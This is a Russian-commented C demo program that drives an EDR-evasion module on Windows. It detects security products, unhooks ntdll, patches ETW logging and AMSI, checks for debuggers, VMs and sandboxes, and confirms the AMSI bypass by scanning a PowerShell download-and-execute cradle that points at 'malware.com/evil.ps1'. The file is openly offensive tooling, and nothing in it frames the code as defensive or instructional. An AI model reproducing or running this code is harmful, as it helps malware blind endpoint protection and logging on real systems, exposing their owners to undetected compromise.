/**
 * @file edr_evasion_demo.c
 * @brief Демонстрационный пример использования модуля обхода EDR
 * 
 * Данный файл демонстрирует базовое использование модуля обхода EDR
 * для обнаружения и обхода защитных механизмов в Windows системах.
 */

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "../core/edr_evasion.h"

// Выводим информацию о обнаруженных EDR решениях
void PrintDetectedEDRInfo(const EDR_EVASION_RESULT* result) {
    printf("=== Обнаруженные EDR решения (%d) ===\n", result->detected_edr_count);
    
    for (uint32_t i = 0; i < result->detected_edr_count; i++) {
        const EDR_INFO* info = &result->detected_edr[i];
        
        printf("[%d] %s (Type: 0x%08X)\n", i + 1, info->name, info->type);
        
        // Выводим процессы
        printf("  Процессы: ");
        BOOL printed = FALSE;
        for (int j = 0; j < 10 && info->process_names[j][0] != '\0'; j++) {
            printf("%s%s", (printed ? ", " : ""), info->process_names[j]);
            printed = TRUE;
        }
        printf("%s\n", (printed ? "" : "Не обнаружены"));
        
        // Выводим драйверы
        printf("  Драйверы: ");
        printed = FALSE;
        for (int j = 0; j < 10 && info->driver_names[j][0] != '\0'; j++) {
            printf("%s%s", (printed ? ", " : ""), info->driver_names[j]);
            printed = TRUE;
        }
        printf("%s\n", (printed ? "" : "Не обнаружены"));
        
        // Выводим службы
        printf("  Службы: ");
        printed = FALSE;
        for (int j = 0; j < 10 && info->service_names[j][0] != '\0'; j++) {
            printf("%s%s", (printed ? ", " : ""), info->service_names[j]);
            printed = TRUE;
        }
        printf("%s\n", (printed ? "" : "Не обнаружены"));
        
        printf("\n");
    }
}

// Выводим информацию о примененных техниках обхода
void PrintEvasionTechniques(const EDR_EVASION_RESULT* result) {
    printf("=== Результаты применения техник обхода ===\n");
    
    printf("Примененные техники (0x%08X):\n", result->applied_techniques);
    if (result->applied_techniques & EVASION_UNHOOK_NTDLL)
        printf("  - Удаление хуков из ntdll.dll\n");
    if (result->applied_techniques & EVASION_PATCH_ETW)
        printf("  - Отключение ETW логирования\n");
    if (result->applied_techniques & EVASION_PATCH_AMSI)
        printf("  - Отключение AMSI\n");
    if (result->applied_techniques & EVASION_SYSCALL_DIRECT)
        printf("  - Прямые системные вызовы\n");
    
    printf("\nУспешные техники (0x%08X):\n", result->successful_techniques);
    if (result->successful_techniques & EVASION_UNHOOK_NTDLL)
        printf("  - Удаление хуков из ntdll.dll\n");
    if (result->successful_techniques & EVASION_PATCH_ETW)
        printf("  - Отключение ETW логирования\n");
    if (result->successful_techniques & EVASION_PATCH_AMSI)
        printf("  - Отключение AMSI\n");
    if (result->successful_techniques & EVASION_SYSCALL_DIRECT)
        printf("  - Прямые системные вызовы\n");
    
    printf("\nНеудачные техники (0x%08X):\n", result->failed_techniques);
    if (result->failed_techniques & EVASION_UNHOOK_NTDLL)
        printf("  - Удаление хуков из ntdll.dll\n");
    if (result->failed_techniques & EVASION_PATCH_ETW)
        printf("  - Отключение ETW логирования\n");
    if (result->failed_techniques & EVASION_PATCH_AMSI)
        printf("  - Отключение AMSI\n");
    if (result->failed_techniques & EVASION_SYSCALL_DIRECT)
        printf("  - Прямые системные вызовы\n");
    
    printf("\n");
}

// Проверка исполнительного контекста
void CheckExecutionContext() {
    BOOL is_debugger = FALSE;
    BOOL is_vm = FALSE;
    BOOL is_sandbox = FALSE;
    
    if (EDREvade_DetectExecutionContext(&is_debugger, &is_vm, &is_sandbox)) {
        printf("=== Исполнительный контекст ===\n");
        printf("Отладчик: %s\n", is_debugger ? "Обнаружен" : "Не обнаружен");
        printf("Виртуальная машина: %s\n", is_vm ? "Обнаружена" : "Не обнаружена");
        printf("Песочница: %s\n", is_sandbox ? "Обнаружена" : "Не обнаружена");
        printf("\n");
    } else {
        printf("Не удалось определить исполнительный контекст\n\n");
    }
}

// Тестовая функция для проверки работы AMSI после патча
BOOL TestAMSIBypass() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi == NULL) {
        printf("Не удалось загрузить amsi.dll\n");
        return FALSE;
    }
    
    typedef BOOL (WINAPI *AmsiInitializeFn)(HANDLE *amsiContext);
    typedef BOOL (WINAPI *AmsiOpenSessionFn)(HANDLE amsiContext, HANDLE *session);
    typedef BOOL (WINAPI *AmsiScanStringFn)(HANDLE amsiContext, LPCWSTR string, LPCWSTR contentName, HANDLE session, AMSI_RESULT *result);
    typedef VOID (WINAPI *AmsiCloseSessionFn)(HANDLE amsiContext, HANDLE session);
    typedef VOID (WINAPI *AmsiUninitializeFn)(HANDLE amsiContext);
    
    // Получаем указатели на функции AMSI
    AmsiInitializeFn pAmsiInitialize = (AmsiInitializeFn)GetProcAddress(hAmsi, "AmsiInitialize");
    AmsiOpenSessionFn pAmsiOpenSession = (AmsiOpenSessionFn)GetProcAddress(hAmsi, "AmsiOpenSession");
    AmsiScanStringFn pAmsiScanString = (AmsiScanStringFn)GetProcAddress(hAmsi, "AmsiScanString");
    AmsiCloseSessionFn pAmsiCloseSession = (AmsiCloseSessionFn)GetProcAddress(hAmsi, "AmsiCloseSession");
    AmsiUninitializeFn pAmsiUninitialize = (AmsiUninitializeFn)GetProcAddress(hAmsi, "AmsiUninitialize");
    
    if (!pAmsiInitialize || !pAmsiOpenSession || !pAmsiScanString || !pAmsiCloseSession || !pAmsiUninitialize) {
        printf("Не удалось получить адреса функций AMSI\n");
        FreeLibrary(hAmsi);
        return FALSE;
    }
    
    // Тестовая строка, которая обычно детектится AMSI
    const wchar_t* testString = L"AmsiScanBuffer IEX(New-Object Net.WebClient).DownloadString('http://malware.com/evil.ps1')";
    
    // Инициализация AMSI
    HANDLE amsiContext = NULL;
    HANDLE session = NULL;
    AMSI_RESULT amsiResult = AMSI_RESULT_CLEAN;
    
    if (!pAmsiInitialize(&amsiContext)) {
        printf("Не удалось инициализировать AMSI\n");
        FreeLibrary(hAmsi);
        return FALSE;
    }
    
    if (!pAmsiOpenSession(amsiContext, &session)) {
        printf("Не удалось открыть сессию AMSI\n");
        pAmsiUninitialize(amsiContext);
        FreeLibrary(hAmsi);
        return FALSE;
    }
    
    // Сканируем строку
    BOOL result = pAmsiScanString(amsiContext, testString, L"test", session, &amsiResult);
    
    // Анализируем результат сканирования
    printf("=== Тест обхода AMSI ===\n");
    printf("Результат сканирования: %s (код: %d)\n", 
           result ? "Успешно" : "Ошибка", amsiResult);
    
    if (result) {
        switch (amsiResult) {
            case AMSI_RESULT_CLEAN:
                printf("Статус: AMSI_RESULT_CLEAN - строка не определена как вредоносная\n");
                printf("Обход AMSI успешно работает!\n");
                break;
            case AMSI_RESULT_NOT_DETECTED:
                printf("Статус: AMSI_RESULT_NOT_DETECTED - вредоносная активность не обнаружена\n");
                printf("Обход AMSI успешно работает!\n");
                break;
            default:
                printf("Статус: Строка определена как потенциально вредоносная (код: %d)\n", amsiResult);
                printf("Обход AMSI не работает или работает некорректно\n");
                break;
        }
    }
    
    // Очистка ресурсов
    pAmsiCloseSession(amsiContext, session);
    pAmsiUninitialize(amsiContext);
    FreeLibrary(hAmsi);
    
    printf("\n");
    return (result && (amsiResult == AMSI_RESULT_CLEAN || amsiResult == AMSI_RESULT_NOT_DETECTED));
}

int main(int argc, char* argv[]) {
    printf("=== Демонстрация модуля обхода EDR ===\n\n");
    
    // Сначала проверяем контекст выполнения
    CheckExecutionContext();
    
    // Инициализация конфигурации модуля
    EDR_EVASION_CONFIG config = {0};
    config.target_edr_mask = EDR_TYPE_ALL;  // Работаем со всеми EDR
    config.techniques_mask = EVASION_UNHOOK_NTDLL | EVASION_PATCH_ETW | EVASION_PATCH_AMSI;
    config.enable_automatic_detection = TRUE;
    config.enable_advanced_diagnostics = TRUE;
    config.restore_hooks_on_exit = TRUE;  // Восстанавливаем хуки при выходе
    
    // Инициализация модуля
    if (!EDREvade_Initialize(&config)) {
        printf("Ошибка при инициализации модуля\n");
        return 1;
    }
    
    printf("Модуль успешно инициализирован\n\n");
    
    // Обнаружение EDR
    EDR_EVASION_RESULT result = {0};
    if (!EDREvade_DetectEDR(&result)) {
        printf("Ошибка при обнаружении EDR\n");
        EDREvade_Cleanup();
        return 1;
    }
    
    // Вывод информации о обнаруженных EDR
    PrintDetectedEDRInfo(&result);
    
    // Применение техник обхода
    if (!EDREvade_ApplyEvasionTechniques(&result)) {
        printf("Предупреждение: не все техники обхода были успешно применены\n\n");
    } else {
        printf("Все техники обхода успешно применены\n\n");
    }
    
    // Вывод информации о примененных техниках
    PrintEvasionTechniques(&result);
    
    // Тест обхода AMSI
    TestAMSIBypass();
    
    // Очистка ресурсов модуля
    EDREvade_Cleanup();
    printf("Модуль успешно завершил работу\n");
    
    return 0;
} 